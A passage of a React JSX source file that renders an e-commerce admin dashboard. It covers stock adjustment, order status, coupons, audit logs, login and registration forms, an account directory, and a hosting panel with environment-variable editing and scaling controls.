                          <div className="font-bold text-sm">{prod.name}</div>
                        </div>
                      </div>
                    </td>
                    <td className="p-4 font-mono-num uppercase text-slate-400">
                      {prod.category}
                    </td>
                    <td className="p-4 font-mono-num font-bold">
                      {formatPrice(prod.price, currency)}
                    </td>
                    <td className="p-4">
                      <div className="flex items-center gap-2">
                        <span
                          className={`inline-flex min-w-16 items-center justify-center rounded-lg px-2.5 py-1 font-mono-num text-xs font-bold ${
                            prod.stock === 0
                              ? 'bg-rose-500/20 text-rose-400'
                              : isLow
                              ? 'bg-amber-500/20 text-amber-400'
                              : 'bg-emerald-500/15 text-emerald-400'
                          }`}
                        >
                          {prod.stock} units
                        </span>

                        <button
                          onClick={() =>
                            onQuickStockUpdate(
                              prod.id,
                              Math.max(0, prod.stock - 1),
                              'Admin -1 Adjustment'
                            )
                          }
                          className={`rounded-lg border px-2 py-1 font-mono-num text-xs font-bold cursor-pointer ${
                            darkMode
                              ? 'border-white/[0.1] bg-slate-800 hover:bg-slate-700 text-slate-200'
                              : 'border-slate-300 bg-slate-100 hover:bg-slate-200 text-slate-800'
                          }`}
                        >
                          -1
                        </button>
                        <button
                          onClick={() =>
                            onQuickStockUpdate(
                              prod.id,
                              prod.stock + 1,
                              'Admin +1 Restock'
                            )
                          }
                          className={`rounded-lg border px-2 py-1 font-mono-num text-xs font-bold cursor-pointer ${
                            darkMode
                              ? 'border-white/[0.1] bg-slate-800 hover:bg-slate-700 text-slate-200'
                              : 'border-slate-300 bg-slate-100 hover:bg-slate-200 text-slate-800'
                          }`}
                        >
                          +1
                        </button>
                        <button
                          onClick={() =>
                            onQuickStockUpdate(
                              prod.id,
                              prod.stock + 10,
                              'Warehouse Batch +10 Restock'
                            )
                          }
                          className="rounded-lg bg-emerald-500/15 hover:bg-emerald-500/25 border border-emerald-500/40 px-2.5 py-1 font-mono-num text-xs font-bold text-emerald-400 cursor-pointer"
                        >
                          +10 Restock
                        </button>
                      </div>
                    </td>
                    <td className="p-4">
                      <button
                        onClick={() => onToggleFlashSale(prod.id, !prod.is_flash_sale)}
                        className={`inline-flex items-center gap-1.5 rounded-lg border px-2.5 py-1 font-mono-num text-[11px] font-semibold transition cursor-pointer ${
                          prod.is_flash_sale
                            ? 'border-amber-500/50 bg-amber-500/20 text-amber-400'
                            : darkMode
                            ? 'border-white/[0.08] bg-slate-950 text-slate-400 hover:text-white'
                            : 'border-slate-200 bg-slate-100 text-slate-600'
                        }`}
                      >
                        <Flame className="h-3.5 w-3.5" />
                        <span>{prod.is_flash_sale ? 'ACTIVE' : 'OFF'}</span>
                      </button>
                    </td>
                    <td className="p-4 text-right">
                      <button
                        onClick={() => onDeleteProduct(prod.id)}
                        className={`rounded-lg border p-2 text-slate-400 hover:border-rose-500/40 hover:text-rose-400 cursor-pointer ${
                          darkMode ? 'border-white/[0.08]' : 'border-slate-200'
                        }`}
                        title="Delete Product"
                      >
                        <Trash2 className="h-4 w-4" />
                      </button>
                    </td>
                  </tr>
                );
              })}
            </tbody>
          </table>
        </div>
      )}

      {/* 2. Order Fulfillment Board */}
      {adminSection === 'orders' && (
        <div className="space-y-3">
          {orders.map((ord) => (
            <div
              key={ord.id}
              className={`flex flex-wrap items-center justify-between gap-4 rounded-3xl p-4 ${cardSurface}`}
            >
              <div className="space-y-1">
                <div className="flex items-center gap-2.5">
                  <span className="font-mono-num text-sm font-bold text-indigo-400">
                    #{ord.order_number}
                  </span>
                  <span className="font-bold text-sm">{ord.customer_name}</span>
                  <span className="text-xs text-slate-400">
                    ({ord.shipping_city}, {ord.shipping_country})
                  </span>
                </div>
                <p className="text-xs text-slate-400">
                  {(ord.items || []).map((i) => `${i.quantity}x ${i.product_name}`).join(' • ')}
                </p>
                <p className="font-mono-num text-[11px] text-slate-400">
                  Tracking: {ord.tracking_number} • Payment: {ord.payment_method}
                </p>
              </div>

              <div className="flex flex-wrap items-center gap-3">
                <div className="text-right mr-2">
                  <div className="font-mono-num text-sm font-bold text-emerald-400">
                    {formatPrice(ord.total, currency)}
                  </div>
                  <div className="font-mono-num text-[10px] text-slate-400">
                    {formatRelativeTime(ord.updated_at)}
                  </div>
                </div>

                <div className="flex flex-wrap items-center gap-1.5">
                  {['placed', 'processing', 'packed', 'shipped', 'delivered', 'cancelled'].map(
                    (st) => (
                      <button
                        key={st}
                        onClick={() => onAdvanceOrderStatus(ord.id, st)}
                        className={`rounded-lg px-2.5 py-1.5 font-mono-num text-[10px] font-bold uppercase transition cursor-pointer ${
                          ord.status === st
                            ? 'bg-indigo-600 text-white shadow-sm'
                            : darkMode
                            ? 'bg-slate-950 border border-white/[0.08] text-slate-400 hover:text-white'
                            : 'bg-slate-100 border border-slate-200 text-slate-700 hover:bg-slate-200'
                        }`}
                      >
                        {st}
                      </button>
                    )
                  )}
                </div>
              </div>
            </div>
          ))}
        </div>
      )}

      {/* 3. Promo & Coupon Engine */}
      {adminSection === 'coupons' && (
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
          <div className="lg:col-span-7 space-y-3">
            {coupons.map((c) => (
              <div
                key={c.id}
                className={`flex items-center justify-between rounded-3xl p-4 ${cardSurface}`}
              >
                <div className="space-y-1">
                  <div className="flex items-center gap-2">
                    <span className="font-mono-num text-sm font-bold text-indigo-400">
                      {c.code}
                    </span>
                    <span className="rounded bg-emerald-500/15 px-2 py-0.5 font-mono-num text-[10px] font-bold text-emerald-400">
                      {c.discount_type === 'percentage'
                        ? `${c.discount_value}% OFF`
                        : `$${c.discount_value} OFF`}
                    </span>
                    <span className="font-mono-num text-[11px] text-slate-400">
                      Min Order: ${c.min_order_amount}
                    </span>
                  </div>
                  <p className="text-xs text-slate-400">{c.description}</p>
                  <p className="font-mono-num text-[11px] text-slate-400">
                    Used {c.used_count} / {c.max_uses} times
                  </p>
                </div>

                <button
                  onClick={() => onToggleCoupon(c.id)}
                  className={`rounded-xl px-3.5 py-2 font-mono-num text-xs font-bold cursor-pointer ${
                    c.active
                      ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/40'
                      : 'bg-slate-500/15 text-slate-400'
                  }`}
                >
                  {c.active ? 'ACTIVE ✓' : 'DISABLED'}
                </button>
              </div>
            ))}
          </div>

          <form
            onSubmit={handleCreateCouponSubmit}
            className={`lg:col-span-5 rounded-3xl p-5 space-y-3.5 ${cardSurface}`}
          >
            <h3 className="font-display text-base font-bold">Create New Promo Code in SQLite</h3>
            <div>
              <label className="block text-[11px] uppercase font-mono-num text-slate-400 mb-1">
                Promo Code
              </label>
              <input
                type="text"
                required
                value={couponCode}
                onChange={(e) => setCouponCode(e.target.value.toUpperCase())}
                placeholder="e.g. NAIROBI30"
                className={`w-full rounded-xl border px-3.5 py-2 font-mono-num text-xs uppercase ${inputSurface}`}
              />
            </div>

            <div>
              <label className="block text-[11px] uppercase font-mono-num text-slate-400 mb-1">
                Description
              </label>
              <input
                type="text"
                required
                value={couponDesc}
                onChange={(e) => setCouponDesc(e.target.value)}
                placeholder="30% VIP flash discount"
                className={`w-full rounded-xl border px-3.5 py-2 text-xs ${inputSurface}`}
              />
            </div>

            <div className="grid grid-cols-3 gap-2.5">
              <div>
                <label className="block text-[11px] uppercase font-mono-num text-slate-400 mb-1">
                  Type
                </label>
                <select
                  value={couponType}
                  onChange={(e) => setCouponType(e.target.value)}
                  className={`w-full rounded-xl border px-2.5 py-2 text-xs ${inputSurface}`}
                >
                  <option value="percentage">% Off</option>
                  <option value="fixed">$ Fixed</option>
                </select>
              </div>
              <div>
                <label className="block text-[11px] uppercase font-mono-num text-slate-400 mb-1">
                  Value
                </label>
                <input
                  type="number"
                  required
                  value={couponVal}
                  onChange={(e) => setCouponVal(e.target.value)}
                  className={`w-full rounded-xl border px-3 py-2 font-mono-num text-xs ${inputSurface}`}
                />
              </div>
              <div>
                <label className="block text-[11px] uppercase font-mono-num text-slate-400 mb-1">
                  Min Order ($)
                </label>
                <input
                  type="number"
                  value={couponMin}
                  onChange={(e) => setCouponMin(e.target.value)}
                  className={`w-full rounded-xl border px-3 py-2 font-mono-num text-xs ${inputSurface}`}
                />
              </div>
            </div>

            <button
              type="submit"
              className="w-full rounded-xl bg-indigo-600 hover:bg-indigo-500 py-2.5 text-xs font-semibold text-white cursor-pointer"
            >
              Save Coupon to SQLite & Broadcast
            </button>
          </form>
        </div>
      )}

      {/* 4. Live Inventory Audit Logs & Real-Time Events */}
      {adminSection === 'logs' && (
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
          <div className={`rounded-3xl p-5 space-y-3 ${cardSurface}`}>
            <h3 className="font-display text-sm font-bold uppercase tracking-wider text-slate-400">
              SQLite Inventory Audit Ledger (`inventory_logs`)
            </h3>
            <div className="space-y-2 max-h-96 overflow-y-auto pr-1">
              {inventoryLogs.map((log) => (
                <div
                  key={log.id}
                  className={`flex items-center justify-between rounded-2xl border p-3 text-xs ${
                    darkMode
                      ? 'border-white/[0.08] bg-slate-950/70'
                      : 'border-slate-200 bg-slate-50'
                  }`}
                >
                  <div>
                    <div className="font-bold">{log.product_name}</div>
                    <div className="text-[11px] text-slate-400">
                      {log.reason} • by {log.actor}
                    </div>
                  </div>
                  <div className="text-right font-mono-num">
                    <span
                      className={`font-bold ${
                        log.change_amount >= 0 ? 'text-emerald-400' : 'text-rose-400'
                      }`}
                    >
                      {log.change_amount >= 0 ? `+${log.change_amount}` : log.change_amount}
                    </span>
                    <div className="text-[10px] text-slate-400">
                      {log.previous_stock} → {log.new_stock} units
                    </div>
                  </div>
                </div>
              ))}
            </div>
          </div>

          <div className={`rounded-3xl p-5 space-y-3 ${cardSurface}`}>
            <h3 className="font-display text-sm font-bold uppercase tracking-wider text-slate-400">
              Real-Time Event Stream (`activity_events`)
            </h3>
            <div className="space-y-2 max-h-96 overflow-y-auto pr-1">
              {activityEvents.map((ev) => (
                <div
                  key={ev.id}
                  className={`rounded-2xl border p-3 text-xs space-y-1 ${
                    darkMode
                      ? 'border-white/[0.08] bg-slate-950/70'
                      : 'border-slate-200 bg-slate-50'
                  }`}
                >
                  <div className="flex items-center justify-between">
                    <span className="font-bold text-indigo-400">{ev.title}</span>
                    <span className="font-mono-num text-[10px] text-slate-400">
                      {formatRelativeTime(ev.created_at)}
                    </span>
                  </div>
                  <p className={darkMode ? 'text-slate-300' : 'text-slate-600'}>{ev.message}</p>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* 5. Root Admin (.env) Authentication, Developer App Progress Tracker & RBAC Accounts */}
      {adminSection === 'auth-rbac' && (
        <div className="space-y-6">
          <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
            {/* Left 6 Cols: .env Root Admin & Developer Login */}
            <form
              onSubmit={handleLoginSubmit}
              className="lg:col-span-6 rounded-3xl p-5 space-y-4 theme-card border border-indigo-500/35"
            >
              <div className="font-mono-num text-[10px] font-bold uppercase text-indigo-400">
                STRICT .ENV ROOT ADMIN &amp; MULTI-DEV AUTHENTICATION (POST /api/auth/login)
              </div>
              <h3 className="font-display text-lg font-bold">
                Authenticate as Root Admin (.env) or Scoped Developer
              </h3>
              <p className="text-xs theme-text-muted">
                Root Admin credentials are strictly stored in <code>.env</code> (<code>process.env.NEX_ADMIN_USERNAME</code> &amp; <code>process.env.NEX_ADMIN_PASSWORD</code>). Other developers authenticate via SQLite <code>user_accounts</code> with scoped RBAC restrictions.
              </p>

              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                <div>
                  <label className="block font-mono-num text-[10px] uppercase theme-text-muted mb-1">
                    Username or Email
                  </label>
                  <input
                    type="text"
                    required
                    value={loginIdentifier}
                    onChange={(e) => setLoginIdentifier(e.target.value)}
                    className="w-full rounded-xl px-3 py-2 text-xs font-mono-num theme-input"
                  />
                </div>
                <div>
                  <label className="block font-mono-num text-[10px] uppercase theme-text-muted mb-1">
                    Password (.env or Account)
                  </label>
                  <input
                    type="password"
                    required
                    value={loginPassword}
                    onChange={(e) => setLoginPassword(e.target.value)}
                    className="w-full rounded-xl px-3 py-2 text-xs font-mono-num theme-input"
                  />
                </div>
              </div>

              <button
                type="submit"
                className="w-full rounded-2xl bg-indigo-600 hover:bg-indigo-500 py-2.5 text-xs font-bold text-white cursor-pointer transition"
              >
                Verify Credentials &amp; Load RBAC Profile
              </button>
            </form>

            {/* Right 6 Cols: Register New Developer / User Account */}
            <form
              onSubmit={handleRegisterAccount}
              className="lg:col-span-6 rounded-3xl p-5 space-y-4 theme-card"
            >
              <div className="font-mono-num text-[10px] font-bold uppercase text-cyan-400">
                DEVELOPER &amp; USER ONBOARDING (POST /api/auth/register)
              </div>
              <h3 className="font-display text-lg font-bold">
                Create Scoped Developer or Customer Account
              </h3>
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-2.5">
                <input
                  type="text"
                  required
                  value={regUsername}
                  onChange={(e) => setRegUsername(e.target.value)}
                  placeholder="Username (e.g. nova_dev)"
                  className="rounded-xl px-3 py-2 text-xs font-mono-num theme-input"
                />
                <input
                  type="email"
                  required
                  value={regEmail}
                  onChange={(e) => setRegEmail(e.target.value)}
                  placeholder="Email (e.g. dev@studio.io)"
                  className="rounded-xl px-3 py-2 text-xs theme-input"
                />
                <input
                  type="text"
                  value={regCompany}
                  onChange={(e) => setRegCompany(e.target.value)}
                  placeholder="Studio / Organization"
                  className="rounded-xl px-3 py-2 text-xs theme-input"
                />
                <select
                  value={regRole}
                  onChange={(e) => setRegRole(e.target.value)}
                  className="rounded-xl px-3 py-2 text-xs theme-input"
                >
                  <option value="developer">Developer (Track Own Apps &amp; Hosting)</option>
                  <option value="user">User / Buyer (Orders &amp; Security Reports)</option>
                </select>
              </div>

              {/* Zero-Canvas Profile Image File Upload for New Developer / User Registration */}
              <div className="rounded-2xl p-3 theme-subtle border border-indigo-500/25 flex flex-wrap items-center justify-between gap-2">
                <div className="flex items-center gap-2.5">
                  <div className="h-10 w-10 rounded-xl bg-slate-950 border border-indigo-500/35 flex items-center justify-center overflow-hidden shrink-0">
                    {isCustomImageSource(regAvatarUrl) ? (
                      <img src={regAvatarUrl} alt="Preview" className="h-full w-full object-cover" />
                    ) : (
                      <span className="text-lg">{regRole === 'developer' ? '👩‍💻' : '👤'}</span>
                    )}
                  </div>
                  <div>
                    <div className="font-mono-num text-[10px] font-bold uppercase text-cyan-400">
                      Profile Image File (No Canvas • Direct FileReader)
                    </div>
                    <input
                      type="text"
                      value={regAvatarUrl}
                      onChange={(e) => setRegAvatarUrl(e.target.value)}
                      placeholder="Upload file or paste image URL..."
                      className="mt-1 rounded-lg px-2.5 py-1 text-[11px] font-mono-num theme-input w-56"
                    />
                  </div>
                </div>
                <label className="inline-flex items-center gap-1.5 rounded-xl bg-indigo-500/20 hover:bg-indigo-500/30 border border-indigo-500/40 px-3 py-1.5 font-mono-num text-[11px] font-bold text-indigo-300 cursor-pointer">
                  <Upload className="h-3.5 w-3.5" />
                  <span>Choose Image File</span>
                  <input
                    type="file"
                    accept="image/*"
                    onChange={(e) => handleUploadRegisterAvatarFile(e.target.files)}
                    className="hidden"
                  />
                </label>
              </div>

              <button
                type="submit"
                className="w-full rounded-2xl bg-emerald-500 hover:bg-emerald-400 py-2.5 text-xs font-extrabold text-slate-950 cursor-pointer transition"
              >
                Register Account in SQLite user_accounts
              </button>
            </form>
          </div>

          {/* 3-Tier Separated Account Directory, Profile Image Uploader & Root Admin Governance */}
          <div className="rounded-3xl p-5 theme-card border border-indigo-500/30 space-y-4">
            <div className="flex flex-wrap items-center justify-between gap-2">
              <div>
                <div className="font-mono-num text-[10px] font-bold uppercase text-indigo-400">
                  3-TIER SYSTEM ACCOUNT DIRECTORY &amp; ZERO-CANVAS PROFILE IMAGE STUDIO
                </div>
                <h3 className="font-display text-lg font-bold">
                  Separated Root Admin (.env), Developer Accounts &amp; Normal System Users
                </h3>
              </div>
              <span className="rounded-xl bg-indigo-500/15 border border-indigo-500/35 px-3 py-1 font-mono-num text-xs font-bold text-indigo-300">
                {resolvedAccounts.length + 1} Total Ecosystem Accounts
              </span>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-3.5">
              {resolvedAccounts.map((acc) => (
                <div
                  key={acc.id}
                  className="rounded-2xl p-4 theme-subtle border border-white/[0.08] flex flex-wrap items-center justify-between gap-3"
                >
                  <div className="flex items-center gap-3">
                    <div className="h-12 w-12 rounded-2xl bg-slate-950 border border-indigo-500/35 flex items-center justify-center overflow-hidden shrink-0">
                      {isCustomImageSource(acc.avatar) ? (
                        <img
                          src={acc.avatar}
                          alt={acc.display_name}
                          className="h-full w-full object-cover"
                        />
                      ) : (
                        <span className="text-xl">
                          {acc.avatar || (acc.role === 'developer' ? '👩‍💻' : '👤')}
                        </span>
                      )}
                    </div>
                    <div>
                      <div className="flex flex-wrap items-center gap-1.5">
                        <span className="font-display text-sm font-bold">{acc.display_name}</span>
                        <span
                          className={`rounded-md px-2 py-0.5 font-mono-num text-[10px] font-bold uppercase ${
                            acc.role === 'developer'
                              ? 'bg-indigo-500/20 text-indigo-300 border border-indigo-500/35'
                              : 'bg-amber-500/20 text-amber-300 border border-amber-500/35'
                          }`}
                        >
                          {acc.role === 'developer' ? 'TIER 2: DEVELOPER' : 'TIER 3: SYSTEM USER'}
                        </span>
                        <span
                          className={`rounded-md px-1.5 py-0.5 font-mono-num text-[9px] font-bold uppercase ${
                            acc.status === 'active'
                              ? 'bg-emerald-500/20 text-emerald-400'
                              : 'bg-rose-500/20 text-rose-400'
                          }`}
                        >
                          {acc.status || 'active'}
                        </span>
                      </div>
                      <div className="font-mono-num text-[11px] theme-text-muted">
                        @{acc.username} • {acc.email} • {acc.company}
                      </div>
                    </div>
                  </div>

                  <div className="flex flex-wrap items-center gap-1.5">
                    <label className="inline-flex items-center gap-1 rounded-xl bg-indigo-500/15 hover:bg-indigo-500/25 border border-indigo-500/35 px-2.5 py-1.5 font-mono-num text-[10px] font-bold text-indigo-300 cursor-pointer">
                      <Upload className="h-3 w-3" />
                      <span>Upload Photo</span>
                      <input
                        type="file"
                        accept="image/*"
                        onChange={(e) => handleUploadDirectoryAccountAvatar(acc, e.target.files)}
                        className="hidden"
                      />
                    </label>
                    {activeAccount.role === 'admin' && (
                      <button
                        type="button"
                        onClick={() => handleAdminToggleAccountStatus(acc)}
                        className="rounded-xl bg-rose-500/15 hover:bg-rose-500/25 border border-rose-500/35 px-2.5 py-1.5 font-mono-num text-[10px] font-bold text-rose-300 cursor-pointer"
                      >
                        {acc.status === 'active' ? 'Suspend' : 'Activate'}
                      </button>
                    )}
                  </div>
                </div>
              ))}
            </div>
          </div>

          {/* Developer App Progress & Telemetry Tracker (`GET /api/developer/my-progress`) */}
          {devProgress && (
            <div className="rounded-3xl p-5 theme-card border border-cyan-500/35 space-y-4">
              <div className="flex flex-wrap items-center justify-between gap-2">
                <div>
                  <div className="font-mono-num text-[10px] font-bold uppercase text-cyan-400">
                    DEVELOPER APP PROGRESS &amp; TELEMETRY TRACKER (GET /api/developer/my-progress?username={devProgress.username})
                  </div>
                  <h3 className="font-display text-lg font-bold">
                    Tracked Apps &amp; Cloud Instances for @{devProgress.username}
                  </h3>
                </div>
                <span className="rounded-xl bg-cyan-500/15 border border-cyan-500/35 px-3 py-1 font-mono-num text-xs font-bold text-cyan-400">
                  {devProgress.unrestrictedAccess ? 'GLOBAL ROOT VIEW (ALL APPS)' : 'SCOPED DEVELOPER VIEW'}
                </span>
              </div>

              <div className="grid grid-cols-2 sm:grid-cols-5 gap-3">
                <div className="rounded-2xl p-3 theme-subtle">
                  <div className="font-mono-num text-[10px] uppercase theme-text-muted">Published Apps</div>
                  <div className="font-mono-num text-xl font-bold text-indigo-400">{devProgress.summary?.publishedAppsCount || 0}</div>
                </div>
                <div className="rounded-2xl p-3 theme-subtle">
                  <div className="font-mono-num text-[10px] uppercase theme-text-muted">Total Downloads</div>
                  <div className="font-mono-num text-xl font-bold text-emerald-400">{(devProgress.summary?.totalDownloads || 0).toLocaleString()}</div>
                </div>
                <div className="rounded-2xl p-3 theme-subtle">
                  <div className="font-mono-num text-[10px] uppercase theme-text-muted">Sandbox Mounts</div>
                  <div className="font-mono-num text-xl font-bold text-cyan-400">{devProgress.summary?.activeSandboxInstalls || 0}</div>
                </div>
                <div className="rounded-2xl p-3 theme-subtle">
                  <div className="font-mono-num text-[10px] uppercase theme-text-muted">Cloud Instances</div>
                  <div className="font-mono-num text-xl font-bold text-amber-400">{devProgress.summary?.activeCloudInstances || 0}</div>
                </div>
                <div className="rounded-2xl p-3 theme-subtle">
                  <div className="font-mono-num text-[10px] uppercase theme-text-muted">Avg Security Score</div>
                  <div className="font-mono-num text-xl font-bold text-emerald-400">{devProgress.summary?.avgSecurityScore || 99}/100</div>
                </div>
              </div>
            </div>
          )}
        </div>
      )}

      {/* 6. Multi-Cloud Hosting & Auto-Scaling Hub (Netlify, Render, Vercel, Fly.io, Railway) */}
      {adminSection === 'hosting' && (
        <div className="space-y-6">
          {/* Live Production Deployments Bridge Strip */}
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <a
              href="https://nex-store-pro.netlify.app/"
              target="_blank"
              rel="noreferrer"
              className="rounded-3xl p-4 sm:p-5 theme-card border border-cyan-500/40 hover:border-cyan-400 flex items-center justify-between gap-3 transition"
            >
              <div className="space-y-1">
                <div className="flex items-center gap-2">
                  <span className="rounded-md bg-cyan-500/20 px-2 py-0.5 font-mono-num text-[10px] font-bold text-cyan-300">
                    NETLIFY EDGE PRODUCTION
                  </span>
                  <span className="h-2 w-2 rounded-full bg-emerald-400 animate-pulse" />
                </div>
                <div className="font-display text-sm sm:text-base font-bold">
                  https://nex-store-pro.netlify.app/
                </div>
                <div className="font-mono-num text-[11px] theme-text-muted">
                  Proxies `/api/*` → `https://nex-store-lj5j.onrender.com/api/:splat`
                </div>
              </div>
              <span className="rounded-xl bg-cyan-500/15 border border-cyan-500/35 px-3 py-1.5 font-mono-num text-xs font-bold text-cyan-300 shrink-0">
                Open Live ↗
              </span>
            </a>

            <a
              href="https://nex-store-lj5j.onrender.com/"
              target="_blank"
              rel="noreferrer"
              className="rounded-3xl p-4 sm:p-5 theme-card border border-indigo-500/40 hover:border-indigo-400 flex items-center justify-between gap-3 transition"
            >
              <div className="space-y-1">
                <div className="flex items-center gap-2">
                  <span className="rounded-md bg-indigo-500/20 px-2 py-0.5 font-mono-num text-[10px] font-bold text-indigo-300">
                    RENDER CLOUD BACKEND &amp; WS
                  </span>
                  <span className="h-2 w-2 rounded-full bg-emerald-400 animate-pulse" />
                </div>
                <div className="font-display text-sm sm:text-base font-bold">
                  https://nex-store-lj5j.onrender.com/
                </div>
                <div className="font-mono-num text-[11px] theme-text-muted">
                  Express + WebSocket (`wss://`) + SQLite WAL + MongoDB Atlas
                </div>
              </div>
              <span className="rounded-xl bg-indigo-500/15 border border-indigo-500/35 px-3 py-1.5 font-mono-num text-xs font-bold text-indigo-300 shrink-0">
                Open Live ↗
              </span>
            </a>
          </div>

          {/* Render & Netlify .env + Blueprint Configuration Studio */}
          <div className="rounded-3xl p-5 sm:p-6 theme-card space-y-4 border border-cyan-500/30">
            <div className="flex flex-wrap items-center justify-between gap-3">
              <div>
                <div className="font-mono-num text-[10px] font-bold uppercase text-cyan-400">
                  RENDER &amp; NETLIFY ENVIRONMENT (.env) &amp; BLUEPRINT STUDIO (`render.yaml` • `netlify.toml`)
                </div>
                <h3 className="font-display text-base sm:text-lg font-bold">
                  Production Environment Variables for Render Backend &amp; Netlify Edge CDN
                </h3>
              </div>
              <div className="flex flex-wrap items-center gap-1.5">
                {[
                  { id: 'render', label: 'Render .env' },
                  { id: 'netlify', label: 'Netlify .env' },
                  { id: 'render-yaml', label: 'render.yaml Blueprint' },
                  { id: 'netlify-toml', label: 'netlify.toml Config' }
                ].map((tab) => (
                  <button
                    key={tab.id}
                    type="button"
                    onClick={() => setEnvStudioTab(tab.id)}
                    className={`rounded-xl px-3 py-1.5 font-mono-num text-xs font-bold cursor-pointer transition ${
                      envStudioTab === tab.id
                        ? 'bg-indigo-600 text-white'
                        : 'theme-subtle hover:border-indigo-500/40'
                    }`}
                  >
                    {tab.label}
                  </button>
                ))}
              </div>
            </div>

            {hostingEnvConfig && (
              <div className="grid grid-cols-1 lg:grid-cols-12 gap-4">
                <div className="lg:col-span-7 space-y-2">
                  <div className="flex items-center justify-between">
                    <span className="font-mono-num text-[11px] text-slate-400">
                      {envStudioTab === 'render' && 'Paste directly into Render Dashboard → Environment → Add from .env'}
                      {envStudioTab === 'netlify' && 'Paste directly into Netlify → Site Configuration → Environment Variables'}
                      {envStudioTab === 'render-yaml' && 'Infrastructure-as-Code Blueprint (/render.yaml)'}
                      {envStudioTab === 'netlify-toml' && 'Netlify Edge Build & Proxy Redirects (/netlify.toml)'}
                    </span>
                    <button
                      type="button"
                      onClick={() => {
                        const textMap = {
                          render: hostingEnvConfig.renderEnvText,
                          netlify: hostingEnvConfig.netlifyEnvText,
                          'render-yaml': hostingEnvConfig.renderYaml,
                          'netlify-toml': hostingEnvConfig.netlifyToml
                        };
                        handleCopyCloudEnv(textMap[envStudioTab], envStudioTab);
                      }}
                      className="rounded-xl bg-emerald-500/20 border border-emerald-500/40 px-3 py-1 font-mono-num text-[11px] font-bold text-emerald-300 cursor-pointer"
                    >
                      {envCopiedLabel === envStudioTab ? '✓ Copied to Clipboard' : 'Copy Block'}
                    </button>
                  </div>
                  <pre className="rounded-2xl bg-slate-950/90 border border-slate-800 p-3.5 font-mono-num text-[11px] text-cyan-300 overflow-x-auto max-h-64 overflow-y-auto leading-relaxed">
                    {envStudioTab === 'render' && hostingEnvConfig.renderEnvText}
                    {envStudioTab === 'netlify' && hostingEnvConfig.netlifyEnvText}
                    {envStudioTab === 'render-yaml' && hostingEnvConfig.renderYaml}
                    {envStudioTab === 'netlify-toml' && hostingEnvConfig.netlifyToml}
                  </pre>
                </div>

                <div className="lg:col-span-5 rounded-2xl p-4 theme-subtle space-y-3 flex flex-col justify-between">
                  <div className="space-y-2">
                    <div className="font-mono-num text-[10px] font-bold uppercase text-indigo-400">
                      LIVE .ENV KEY-VALUE INSPECTOR &amp; UPDATER (ROOT ADMIN)
                    </div>
                    <div className="space-y-1.5 max-h-40 overflow-y-auto pr-1">
                      {(envStudioTab === 'netlify' ? hostingEnvConfig.netlifyVars : hostingEnvConfig.renderVars || []).map((item) => (
                        <div key={item.key} className="rounded-xl px-2.5 py-1.5 bg-slate-950/50 border border-slate-800/80 flex items-center justify-between gap-2 text-[11px]">
                          <div className="truncate">
                            <span className="font-mono-num font-bold text-emerald-400">{item.key}</span>
                            <span className="text-slate-400 font-mono-num">={item.value}</span>
                          </div>
                          <button
                            type="button"
                            onClick={() => {
                              setCustomEnvKey(item.key);
                              setCustomEnvVal(item.value);
                            }}
                            className="text-[10px] font-mono-num text-indigo-400 hover:underline shrink-0 cursor-pointer"
                          >
                            Edit
                          </button>
                        </div>
                      ))}
                    </div>
                  </div>

                  <form onSubmit={handleSaveCloudEnvVar} className="space-y-2 pt-2 border-t border-slate-700/40">
                    <div className="grid grid-cols-2 gap-2">
                      <input
                        type="text"
                        value={customEnvKey}
                        onChange={(e) => setCustomEnvKey(e.target.value.toUpperCase())}
                        placeholder="ENV_KEY (e.g. VITE_API_BASE_URL)"
                        className="rounded-xl px-2.5 py-1.5 text-xs font-mono-num theme-input"
                      />
                      <input
                        type="text"
                        value={customEnvVal}
                        onChange={(e) => setCustomEnvVal(e.target.value)}
                        placeholder="Value"
                        className="rounded-xl px-2.5 py-1.5 text-xs font-mono-num theme-input"
                      />
                    </div>
                    <button
                      type="submit"
                      className="w-full rounded-xl bg-indigo-600 hover:bg-indigo-500 py-1.5 text-xs font-bold text-white cursor-pointer"
                    >
                      Save Variable to .env &amp; Sync Render/Netlify Config
                    </button>
                  </form>
                </div>
              </div>
            )}
          </div>

          <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
          <div className="lg:col-span-8 space-y-3">
            {resolvedDeployments.map((dep) => (
              <div key={dep.id} className="rounded-3xl p-4 sm:p-5 theme-card flex flex-wrap items-center justify-between gap-4">
                <div className="space-y-1">
                  <div className="flex flex-wrap items-center gap-2">
                    <span className="rounded-lg bg-indigo-500/20 border border-indigo-500/40 px-2.5 py-0.5 font-mono-num text-[10px] font-bold text-indigo-300">
                      {dep.provider}
                    </span>
                    <span className="font-display text-sm font-bold">{dep.app_name}</span>
                    <span className="font-mono-num text-[11px] text-cyan-400">@{dep.owner_username}</span>
                    <span className="rounded-md bg-emerald-500/15 px-2 py-0.5 font-mono-num text-[10px] font-bold text-emerald-400">
                      {dep.status} • SSL
                    </span>
                  </div>
                  <div className="font-mono-num text-xs theme-text-muted">
                    {dep.deploy_url} • Region: {dep.region}
                  </div>
                  <div className="font-mono-num text-[11px] text-slate-400">
                    Instances: <strong className="text-emerald-400">{dep.current_instances}</strong> (Auto-Scale {dep.min_instances}–{dep.max_instances}) • CPU: {dep.cpu_utilization}% • RAM: {dep.memory_mb} MB
                  </div>
                </div>

                <div className="flex items-center gap-2">
                  <button
                    type="button"
                    onClick={() => handleScaleHosting(dep, -1)}
                    className="rounded-xl px-3 py-1.5 font-mono-num text-xs font-bold theme-subtle cursor-pointer"
                  >
                    -1 Node
                  </button>
                  <button
                    type="button"
                    onClick={() => handleScaleHosting(dep, 1)}
                    className="rounded-xl bg-indigo-600 hover:bg-indigo-500 px-3 py-1.5 font-mono-num text-xs font-bold text-white cursor-pointer"
                  >
                    +1 Scale Out
                  </button>
                </div>
              </div>
            ))}
          </div>

          <form onSubmit={handleDeployHosting} className="lg:col-span-4 rounded-3xl p-5 space-y-3 theme-card h-fit">
            <div className="font-mono-num text-[10px] font-bold uppercase text-cyan-400">
